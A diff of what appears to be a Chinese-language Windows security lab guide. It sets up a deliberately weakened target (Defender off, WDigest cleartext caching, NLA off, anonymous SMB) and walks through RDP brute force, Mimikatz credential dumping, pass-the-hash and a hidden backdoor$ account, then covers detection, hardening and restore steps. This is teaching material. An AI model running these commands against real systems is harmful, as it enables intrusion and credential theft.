@@ -267,7 +267,53 @@ Windows中用户名以 `$` 结尾时，该账户有以下特性：
 | 网络适配器 | NAT模式 |
 | 快照 | 实验前创建快照（命名：实验二-初始状态） |
 
-**靶机初始化脚本**（管理员PowerShell执行，**必须先完成下方密码策略配置**）：
+<aside>
+⚠️
+
+**⚠️ 必须按顺序执行！** 配置顺序为：① 密码策略（secpol.msc）→ ② 本地策略/安全选项（secpol.msc）→ ③ 初始化脚本。顺序错误会导致弱密码账户创建失败或空会话枚举不通。
+
+</aside>
+
+<aside>
+⚙️
+
+**第一步：密码策略配置（secpol.msc → 账户策略）**
+
+1. 运行 `secpol.msc` → 本地安全策略
+2. 安全设置 → 账户策略 → **密码策略**：
+    - 密码必须符合复杂性要求：**已禁用**
+    - 密码长度最小值：**0 个字符**
+    - 密码最长使用期限：**无限制**
+    - 密码最短使用期限：**0 天**
+3. 账户策略 → **账户锁定策略**：
+    - 账户锁定阈值：**0 次无效登录**（永不锁定）
+4. 执行 `gpupdate /force` 使策略生效
+</aside>
+
+<aside>
+⚙️
+
+**第二步：空会话策略配置（secpol.msc → 本地策略 → 安全选项）**
+
+Windows Server 2025 默认禁止匿名 SMB 枚举，必须手动放开才能让阶段一的 enum4linux/rpcclient 正常工作。
+
+安全设置 → 本地策略 → 安全选项：
+
+| 策略名称 | 设置值 |
+| --- | --- |
+| 网络访问: 不允许匿名枚举 SAM 帐户 | **已禁用** |
+| 网络访问: 不允许匿名枚举 SAM 帐户和共享 | **已禁用** |
+| 网络访问: 让"每个人"权限应用于匿名用户 | **已启用** |
+
+执行 `gpupdate /force` 使策略生效。
+
+> **英文系统对应策略名**：
+> - Network access: Do not allow anonymous enumeration of SAM accounts → **Disabled**
+> - Network access: Do not allow anonymous enumeration of SAM accounts and shares → **Disabled**
+> - Network access: Let Everyone permissions apply to anonymous users → **Enabled**
+</aside>
+
+**第三步：靶机初始化脚本**（管理员 PowerShell 执行，**必须先完成上述两步 secpol.msc 配置**）：
 
 ```powershell
 # ============================================
@@ -291,35 +337,39 @@ Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" 
 # 注意：中文版Windows使用中文组名，英文版使用 "Remote Desktop"
 Enable-NetFirewallRule -DisplayGroup "远程桌面"
 
-# 4. 关闭防火墙（仅实验环境）
+# 4. 禁用 RDP 网络级别身份验证（NLA），否则 Hydra RDP 模块无法爆破
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0
+
+# 5. 关闭防火墙（仅实验环境）
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
-# 5. 重启使策略生效
+# 6. 启用 SMB1 协议（enum4linux 依赖 SMB1，Server 2025 默认禁用）
+Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
+
+# 7. 关闭 Windows Defender 实时防护（否则 Mimikatz.exe 会被自动隔离）
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# 8. 启用 WDigest 明文密码缓存（让 Mimikatz 能提取到明文密码，默认已禁用）
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+# 9. 重启使所有配置生效
 Restart-Computer -Force
 ```
 
 <aside>
-⚠️
+💡
 
-**⚠️ 必须先执行此步骤！在运行下方初始化脚本之前，必须先禁用密码策略，否则弱密码账户将创建失败。**
+**重启后验证**：靶机重启完成后，在 Kali 上先跑一条快速检查确认环境就绪：
 
-</aside>
+```bash
+# 验证 SMB 连通性（应返回共享列表）
+smbclient -L //192.168.1.20 -N
 
-<aside>
-⚙️
+# 验证匿名用户枚举（应返回用户列表）
+rpcclient -U "" 192.168.1.20 -c "enumdomusers"
+```
 
-**密码策略图形界面配置（先于脚本执行）**
-
-1. 运行 `secpol.msc` → 本地安全策略
-2. 安全设置 → 账户策略 → **密码策略**：
-    - 密码必须符合复杂性要求：**已禁用**
-    - 密码长度最小值：**0 个字符**
-    - 密码最长使用期限：**无限制**
-    - 密码最短使用期限：**0 天**
-3. 账户策略 → **账户锁定策略**：
-    - 账户锁定阈值：**0 次无效登录**（永不锁定）
-4. 执行 `gpupdate /force` 使策略生效
-5. **确认策略已生效后**，再执行下方的初始化脚本
+若以上两条均正常返回，说明 SMB1 和空会话配置生效，可继续实验。
 </aside>
 
 ---
@@ -340,18 +390,20 @@ Restart-Computer -Force
 **步骤1：通过空会话枚举用户列表**
 
 ```
-# 使用enum4linux枚举Windows信息
+# 使用enum4linux枚举Windows信息（依赖 SMB1，需靶机已启用）
 enum4linux -a 192.168.1.20
 
 # 使用rpcclient枚举用户
 rpcclient -U "" 192.168.1.20 -c "enumdomusers"
 
-# 使用CrackMapExec进行SMB枚举
+# 使用 CrackMapExec / NetExec 进行SMB枚举
+# 注意：Kali 2024+ 中 CrackMapExec 已更名为 NetExec (nxc)
+# 若 crackmapexec 命令不存在，改用 nxc
 crackmapexec smb 192.168.1.20 --users
 crackmapexec smb 192.168.1.20 --groups
 crackmapexec smb 192.168.1.20 --shares
 
-# 使用nbtscan获取NetBIOS信息
+# 使用nbtscan获取NetBIOS信息（需先安装：sudo apt install nbtscan）
 nbtscan 192.168.1.20
 ```
 
@@ -359,6 +411,8 @@ nbtscan 192.168.1.20
 💡
 
 **知识关联**：对应讲义中"用户账户分类"——通过空会话可以枚举到本地用户列表，为后续暴力破解提供用户名字典。
+
+**工具说明**：CrackMapExec 在较新版本的 Kali 中已更名为 NetExec，命令从 `crackmapexec` 变为 `nxc`，参数语法不变。若 `crackmapexec` 命令不可用，请运行 `sudo apt install netexec` 后使用 `nxc` 替代。
 
 </aside>
 
@@ -453,7 +507,7 @@ crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' --shares
 **步骤5：RDP远程桌面暴力破解**
 
 ```
-# 使用Hydra进行RDP暴力破解
+# 使用Hydra进行RDP暴力破解（需靶机已禁用NLA，见初始化脚本第4步）
 hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://192.168.1.20
 
 # 使用Crowbar进行RDP爆破
@@ -462,6 +516,13 @@ crowbar -b rdp -s 192.168.1.20/32 -U /tmp/users.txt -C /tmp/passwords.txt
 # 使用NCrack进行RDP爆破
 ncrack -vv -U /tmp/users.txt -P /tmp/passwords.txt rdp://192.168.1.20
 ```
+
+<aside>
+💡
+
+**NLA 说明**：Windows Server 2025 默认启用网络级别身份验证（NLA），要求客户端在建立 RDP 会话前先完成认证，这会导致 Hydra/Crowbar 的 RDP 模块无法工作。初始化脚本已将 NLA 关闭（`UserAuthentication = 0`）。若未关闭，RDP 爆破会全部失败。
+
+</aside>
 
 **步骤6：破解成功后使用获取的凭据访问系统**
 
@@ -501,6 +562,15 @@ xfreerdp3 /v:192.168.1.20 /u:weakadmin /p:admin123 /cert:tofu
 
 在Windows Server靶机上以管理员身份执行：
 
+<aside>
+⚠️
+
+**Windows Defender 处理**：初始化脚本已关闭 Defender 实时防护。若 Mimikatz 仍被隔离，手动添加排除项：`Add-MpPreference -ExclusionPath "C:\Tools"`。也可将 Defender 服务暂时停止：`Stop-Service -Name WinDefender -Force`。
+
+**WDigest 明文密码**：Windows Server 2025 默认不缓存明文密码（WDigest 禁用）。初始化脚本已启用 `UseLogonCredential=1`，**但需要用户在启用后重新登录一次**（注销再登录），LSASS 中才会缓存明文密码。否则 `sekurlsa::logonpasswords` 只会显示 NTLM 哈希，明文密码处显示 `(null)`。
+
+</aside>
+
 ```bash
 # 下载Mimikatz到靶机
 # 从攻击机传输（已在靶机上以管理员权限运行）
@@ -521,8 +591,11 @@ sekurlsa::logonpasswords
 # Session           : Interactive from 2
 # User Name         : weakadmin
 # Domain            : TARGET-SERVER
-# Password          : admin123          ← 明文密码！
+# Password          : admin123          ← 明文密码！（需 WDigest 已启用 + 重登录）
 # NTLM              : 31d6cfe0d16ae931b73c59d7e0c089c0  （示例值，实际值取决于密码）
+#
+# 若 Password 显示 (null)，说明 WDigest 未生效或未重登录，
+# 此时 NTLM Hash 仍然可用，可继续后续 Pass-the-Hash 步骤。
 
 # 导出本地SAM数据库中所有账户的哈希
 lsadump::sam
@@ -547,10 +620,13 @@ sekurlsa::pth /user:weakadmin /domain:. /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
 
 ```
 # 从Kali攻击机使用Impacket工具进行PtH
-python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
-# 若上述路径不存在，直接使用：psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
-python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
-python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
+# 注意：Kali 2024+ 中 Impacket 工具有两种调用方式：
+#   方式一（推荐）：直接使用命令名 impacket-psexec / impacket-wmiexec / impacket-smbexec
+#   方式二：python3 调用脚本路径
+impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
+# 或：psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
+impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
+impacket-smbexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
 ```
 
 <aside>
@@ -592,14 +668,18 @@ net user
 # 注意：backdoor$ 不会出现在列表中
 
 # 方法二：使用wmic可发现隐藏账户
+# 注意：wmic 在 Server 2025 中已弃用但仍可用，若不可用请跳到方法三/四
 wmic useraccount list full | findstr backdoor
 
 # 方法三：直接查询注册表（需SYSTEM权限）
 reg query "HKLM\SAM\SAM\Domains\Account\Users\Names"
 
-# 方法四：使用PowerShell
+# 方法四：使用PowerShell（推荐，Server 2025 首选方式）
 Get-LocalUser | Select-Object Name, Enabled, Description
 # $结尾的账户也会显示
+
+# 方法五：CIM 查询（wmic 的现代替代）
+Get-CimInstance -ClassName Win32_UserAccount | Where-Object { $_.Name -like '*$*' } | Select-Object Name, SID
 ```
 
 ```
@@ -660,8 +740,10 @@ crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' --users
 #   账户锁定时间 → 15 分钟
 #   复位账户锁定计数器的时间间隔 → 15 分钟
 
-# 方法二：通过命令行（有限制，部分需组策略）
-net accounts /minpwlen:8 /maxpwage:90 /uniquepw:5 /lockoutthreshold:5 /lockoutduration:15
+# 方法二：通过命令行
+# 密码策略和锁定策略建议分开执行
+net accounts /minpwlen:8 /maxpwage:90 /uniquepw:5
+net accounts /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15
 gpupdate /force
 
 # 验证策略
@@ -677,6 +759,10 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 
 # 启用Windows Defender Credential Guard（需重启）
 # 方法：gpedit.msc → 计算机配置 → 管理模板 → 系统 → Device Guard
 #   开启虚拟化安全 → 启用
+#
+# 注意：Credential Guard 需要 TPM 2.0 + Secure Boot + UEFI，
+# 虚拟机环境通常不具备这些条件，此步骤可能无法启用。
+# 在 VM 环境中仅演示 RunAsPPL 即可，Credential Guard 作为知识扩展了解。
 
 # 需要重启生效
 Restart-Computer -Force
@@ -758,19 +844,38 @@ privilege::debug
     net user user4 /delete
     net user weakadmin /delete
     net user backdoor$ /delete
-    
+
     # 2. 恢复密码策略
     secpol.msc
-    # 恢复为默认安全配置
-    
+    # 恢复为默认安全配置（启用密码复杂度、设置锁定阈值等）
+
     # 3. 关闭远程桌面
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
-    
-    # 4. 启用防火墙
+
+    # 4. 恢复 NLA（网络级别身份验证）
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+
+    # 5. 启用防火墙
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
-    
-    # 5. 删除Mimikatz等工具
+
+    # 6. 恢复 Windows Defender 实时防护
+    Set-MpPreference -DisableRealtimeMonitoring $false
+
+    # 7. 禁用 WDigest 明文密码缓存
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f
+
+    # 8. 恢复空会话限制（阻止匿名枚举）
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymousSam /t REG_DWORD /d 1 /f
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 0 /f
+
+    # 9. 禁用 SMB1 协议
+    Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
+
+    # 10. 删除Mimikatz等工具
     Remove-Item -Path "C:\Tools" -Recurse -Force
+
+    # 11. 重启使所有恢复生效
+    Restart-Computer -Force
     ```
     
 
